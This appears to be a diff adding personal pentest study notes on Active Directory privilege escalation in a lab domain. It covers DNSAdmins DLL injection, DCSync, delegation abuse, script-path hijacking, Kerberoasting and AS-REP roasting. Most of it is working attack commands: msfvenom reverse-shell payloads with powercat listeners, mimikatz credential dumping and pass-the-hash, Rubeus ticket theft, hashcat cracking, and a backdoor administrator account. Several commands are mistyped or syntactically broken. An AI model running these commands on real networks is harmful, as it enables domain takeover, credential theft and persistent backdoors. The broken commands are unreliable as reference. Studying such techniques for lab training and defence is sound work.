@@ -1,0 +1,345 @@
+Domain Privesc
+
+Dll injection
+DC sync attack
+Unconstrained Delegation
+Constrained Delegation
+Kerberoasting
+
+
+
+DLL injection and Exploit a DNS server using Domain COntroller
+
+Scenario here is that we have allready got password for Domain Controller and now we have access to both student1 and DC pc since we have ntlm hash and ip for DC 
+
+You must be on server and local admin of that system which is running as server
+
+cd C:\AD 
+.\Powerview.ps1
+Get-DomainGroupMember -SamAccountName DNSAdmins 
+Get-ObjectAcl-SamAccountName DNSAdmins -ResolveGUIDS | ?{($_.ActiveDirectoryRights -match 'Generic All')}
+Get-ObjectAcl-SamAccountName DNSAdmins -ResolveGUIDS | ?{($_.ActiveDirectoryRights -match 'Generic All') -and {$_.SecurityIdentifier -match '<SID>')}
+since we have Generic all account verified we can add ourselves to DNS admins group 
+
+acc to scenario this below cmd is ran from DC and student1 is being added to DomainAdmins group but before adding student1,  according to scenario DC added itself to Domain admins firstly using server manager 
+Add-DomainGroupMember -Identify 'DNS admins' -Members 'student1'
+
+Get-DomainUser -Name student1
+
+Get-ObjectAcl-SamAccountName DNSAdmins -ResolveGUIDS | ?{($_.ActiveDirectoryRights -match 'Generic All') -and {$_.SecurityIdentifier -match '<SID>')}
+
+Get-DomainGroup -samAccountName DNS admins
+Get-DomainUser -samAccountName DNS admins
+
+since we are dns admins we can inject our DLL 
+
+lets create payload.dll
+
+
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST =<ip> LPORT =4444 -f dll >privesc.dll 
+
+ifconfig
+
+python3 -m http.server
+
+Download it on server machine of yours of which you have local admin access
+
+put it in folder in AD in C directory C:\AD\priv and share it to everyone on filesahare
+
+folder priv> properties > share > eveyone > add > share > \\student\priv >> properties > security > Everybody  > full access
+
+Now we will wait for reverse shell As we are going to inject this dll into DNS dll path. As the registerd path of DNS dll is called , we will get the reverse shell
+
+
+
+
+
+dnscmd dc.pentesting.local /config/serverlevelplugindll \\student\priv\privesc.dll
+
+This is for powershell, whenever dns is installed form roles and features of server manager , it provides us with this tool to make configuration and changes to dns server if you are dns admins
+
+so we have added a path of privesc.dll in DNS server by name of serverlevelplugin. we can confirm it
+
+
+Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\parameters
+
+or GO in registry editor to check it manually , this all is done in DomainController Windows
+
+DC :: sc.exe\\dc.pentesting.local\stop dns
+      sc.exe\\dc.pentesting.local\start dns
+      
+student :: ..\Powercat.ps1
+           powercat -l -p 4444 -Verbose
+           And we will get shell as Domain controller or Administrator of domains
+           
+           and now you can add new user to get persistent backdoor 
+           net user tito passwd 123 /add
+           net localgroup Administrator tito /add
+
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+
+DC sync attack
+
+cred dump , Golden tickets, silver tickets
+
+hacker needs to compromise a user with replicating Directory changes all and Replicating Directory changes privileges
+You can check this privs manually in DC   :    Server manager > Pentesting.local >Right click > Properties
+
+StudentPC 
+powershell -ep bypass
+impoert-module .\Powerview.ps1
+Get-ForestGlobalCatalog
+Get-DomainUser -Name student1
+Get-ObjectAcl "DC=pentesting,DC=local" -ResolveGUIDS | ?{($_.ObjectACEtype -like 'DS-Replication*') -and {$_.SecurityIdentifier -match '<SID>')}
+
+so we will get to know about if any permissions starting with DSReplication is given to Specified SID or not
+
+DSReplication- 
+Get -Changes-in-FilteredSet 
+Get-Change
+Synchronize
+Get-Changes-All
+
+if you got these three permission with your SID then you are ready for DC sync attack, we will try to find creds for administrator account here in this scenario since administrator here on student1 pc is part of DomainAdmins 
+
+import-module .\Invoke-Mimikatz.ps1
+invoke-mimikatz -command '"lsadump::dcsync /user:pentesting \administrator"'
+so we will get NTLM hash for user whole Administrator access in Domain
+
+pth
+
+Invoke-Mimikatz -Command '"sekurlsa :: pth /user: administrator /domain : pemntesting /ntlm : <hash> /run : powershell.exe"'
+
+Now you will get new window 
+invoke-command -ComputerName dc.pentesing.local -ScriptBlock(whomai; hostname)
+Enter-PSSession -ComputerName dc.pentesting.local
+
+
+
+--------------------------------------------------------------------------------------------------------------------------------------
+
+
+Unconstrained Delegation
+ 
+ 
+allow server application to impersonate a client when the server connects to other network resources
+
+
+how to see this setting  in server manager
+server mmanager> pentesting,local > Rigth click> Manage > computer> student > Right click > properties> trust this computer to delegation to any service (kerberos only) ------------- this mean we can impersonate a client
+
+since i am able to impersonate anybody of whom we have ticket , so to get ticket , we are going to trick domain conntroller server to conec tot me via spool sample bug known as le christleson. That way we are going to get TGT from DC which will let us impersonate as DC
+
+cd C:\AD
+powershell -ep bypass
+import-module .\powerview.ps1
+Get-DomainComputer - Unconstrained  -----------------  o/p: dc\ad  and student both of them are unconstrained 
+
+.\Rubeus.exe monitor /interval:1
+.\SpoolSample.exe dc.pentesting.local student.pentesing.local
+
+We tried to connect to DC but this bug let DC get tricked i.e. DC will think that DC has to make connection with student and it will send TGT which we will catch / intercept using rubeus
+
+Copy and paste into files and remove all the spaces b/w keys you get and save the file
+Search > Replace space(\s*) with nothing 
+
+.\Rubeus.exe triage
+             klist
+open new window adminisrtrator powershell
+.\Rubeus.exe ptt /ticket : <full hash of tgt you saved in prev step>
+
+Now we will go for dc sync attACK
+
+import-module .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz -command '"lsadump::dcsync /user:pentesting \administrator"'
+
+let us try pth now
+Invoke-Mimikatz -Command '"sekurlsa :: pth /user: administrator /domain : pentesting /ntlm : <hash> /run : powershell.exe"'
+
+Now you will get new window 
+invoke-command -ComputerName dc.pentesing.local -ScriptBlock(whomai; hostname)
+Enter-PSSession -ComputerName dc.pentesting.local
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------
+
+
+Constrained Delegation
+
+
+This comes when hackers started using unconstrained Delegation . You can restrict the services to which the specified server can act on behalf of
+After this delegation new settings come up to step the other servers to use all resources of other servers if he has impersonation permission
+That is you can allocate particular and neccessary serv9ices to be used by other servers having impersonation permission.
+
+how constrained delegation setting is being enabled on system 
+servr manager > pentesting.local > Right click > manage> computer >Student > Right click > properties > Trust this computer for delegation to specified services only , use kerberos only , service to which this account can present delegated credentials 
+
+Get-DomainComputer -TrustedToAuth ------ will show all constrained delegation settings enabled computer O/p :msds-allowed-to-delgate-to{time/dc.pentesting.local} ----------------- only time service is allowed for student server to access on dc server
+
+
+open nw ps window
+
+cd C:\AD \\
+..\invoke-Mimikatz.ps1
+
+We will get hashes of users , let us give some other user student$'s hash for kekeo tgt asking
+
+*************************
+
+
+Now we will run kekeo.exe
+.\Kekeo.exe
+#tgt::ask /user:student$ /domain:pentesting.local /rc4:<ntlm hash>        ----------------- we asked for ticket to interact with DC
+                                  -------- O/P tgt stored in file TGT_student$@PENTESTING.LOCAL_Krbtgt_pentesting.local@PENTESTING.LOCAL.kirbi
+                                                                          
+#tgs::s4u /tgt:TGT_student$@PENTESTING.LOCAL_Krbtgt_pentesting.local@PENTESTING.LOCAL.kirbi /user:administrator@pentesting.local /service:time /ad.pentesting.local \ldap /ad.pentesing.local         ------- we asked for tgs sating tgt , user you want to interact to , service for which you want tgs , your domain
+
+
+************************
+
+
+Invoke-Mimikatz -command '"kerberos :: ptt TGS_Administrator@pentesting.local@PENTESTING.LOCAL_student$@PENTESTING.LOCAL.Kirbi"'
+
+dir \\dc \c$
+klist
+we can now perform dc sync attack
+and after we get hashes from krbtgt we can perform goldn ticket attack
+
+Invoke-Mimikatz -command '"lsadump::dcsync /user:pentesting \krbtgt"'
+
+..\Powerview.ps1
+Get-DomainGroupMember -samAccountName 'Domain Admins'
+
+
+..\invoke-Mimikatz.ps1
+Invoke-Mimikatz -command '"lsadump::dcsync /user:pentesting \savitar"'
+we will get ntlm hash and now we can do pth attack
+
+Invoke-Mimikatz -command '"sekurlsa::pth /user:savitar /domain:pentesting /ntlm:<hash> /run:powershell.exe"'
+
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+
+ACL Generic Wirte on user
+
+If you find Generic Write on user , you might change any script path which mean whenever user try to run that script ,his system will execute malacious scripts that we embeded in path
+
+../powerview.ps1
+Get-ObjectAcl-SamAccountName -ResolveGUIDS | ?{($_.ActiveDirectoryRights -match 'Generic Write') -and {$_.SecurityIdentifier -match '<SID>')}
+check for user if it has Generic write  ----------- this case HADAMs
+
+
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST =<ip> LPORT =4444 -f exe >prives.exe 
+
+Download this payload on AD fileshare 
+
+Go to file explorer C:/AD/priv and copy that payload here
+Now go to prop of privesc > share > everybody >ok >Security > everyone has full access to it
+                                   \\student \priv  
+                                   
+                                   
+Get-DomainUser -Identity hadams -Properties scriptpath
+Set-DomainObject -Identity hadams -Set@{'scriptpath'='\\student\prives.exe'}
+
+..\powercat.ps1
+powercat -l -p 4444 -verbose 
+
+and as we will open the rdp session to hadams we will get reverse shell
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+
+Set SPN Kerberoast
+
+.\Invoke-Kerberoast
+..\Powerview.ps1
+invoke-kerberoast
+Get-ObjectAcl-SamAccountName DNSAdmins -ResolveGUIDS | ?{($_.ActiveDirectoryRights -match 'Generic Write') -and {$_.SecurityIdentifier -match '<SID>')}
+
+User can ask for TGT to run or use specific service on domain or resources.
+TGS encrypted with NTLM hash of service account for requested resources
+Windows uses service principle name to identify which service account is been used to encrypt TGS.
+If we found some account that has SPN set up then we can do the kerberoasting
+If you find some account that dont have SPN set up but has GBeneric write then we can set up SPN and do kerberoasting
+
+Get-DomainUser -Identify hadams | select serviceprincipalname = 'ops/whatever'
+
+invoke-kerberoast -------------------- THis will gibe you ticket , Copy the ticket an dremove th espaces from ticket (\s* to nothing) 
+[hashcat -m 13100 hash.txt rockyou.txt --Force --Show] -- ---- --- passwd cracking
+
+Get-DomainUser -samAccountName hadams
+Get-DomainComputer
+
+Now you will get RDP as you cracked passwd
+
+
+
+------------------------------------------------------------------------------------------------------------------------------------
+
+Targeted Kerberoasting ASREPs Finding
+
+After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called ASREPRoasting. ASReproasting occurs when a user account has the privilege “Does not require Pre-Authentication” set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.
+Retrieving Kerberos Tickets
+Impacket has a tool called “GetNPUsers.py” (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that’s necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.
+
+
+.\Powerview.ps1
+Get-DomainUser -Preauth NotRequired -Verbose   ---------------- o/p savitar  on behalf of this user we are going to request AES REQ and we will get AES REP msg from DC
+
+
+..\AESREPRoast.ps1 
+Invoke-AESREPRoast -verbose  ------------------ Go to each user and find those who have don't req pre auth.. If you have done username enum before then you can give username too.
+
+
+.\Rubeus.exe asreproast /format:hashcat /outfile:s4vitar.aesreproast   --After running this you will get a hash stored in s4vitar.aesreproast
+
+crack the hash using hashcat 
+
+hahscat -m 18200 --force -a 0 s4vitar.asreproast rockyou.txt --show
+
+Enter-PSSession -ComputerName AD -credentials pentesting\s4vitar
+
+
+--------------------------------------------------------------------------------------------------------------------------------------- 
+
+
+Targeted Kerberoasting AESREP SET 
+
+We were not given preuth not required  i.e  “Does not require Pre-Authentication” not set but we are given Gneric write access and using that we can set this permission
+
+..\Powerview.ps1
+Get-DomainUser -Preauth NotRequired 
+Get-DomainUser -Name student1
+Get-ObjectAcl-SamAccountName Hadams -ResolveGUIDS | ?{($_.ActiveDirectoryRights -match 'Generic All') -and {$_.SecurityIdentifier -match '<SID>')}
+
+We will find if this SID holder has Generic all permission, VCheck for generic write too and without ADRights filter 
+
+Get-ObjectAcl-SamAccountName Hadams -ResolveGUIDS | ?{$_.SecurityIdentifier -match '<SID>')}
+
+Set-DomainObject -Identity hadams -XOR@{useraccountcontrol -4194304} -Verbose
+
+UAC-4194304 mean dont require pre auth 
+This flag given on ms windows doc article -- use the useraccountcontrol flagsto manipulate user account properties
+
+Get-DomainUser -Preauth NotRequired 
+
+Now we can perform some attacks as we did before
+
+.\Rubeus.exe asreproast /format:[hashcat|john]
+
+Set-DomainObject -Identity hadams -XOR@{useraccountcontrol=512} -Verbose
+this has set the account back to normal
+
+take the hash file to linux and cracking passwd using hashcat
+
+hashcat -m 18200 --force  -a 0 hadams.asreproast rockyou.txt
+
+
+Get-ObjectAcl-SamAccountName Hadams
+Enter-PSSession -ComputerName AD -credentials pentesting\s4vitar
+
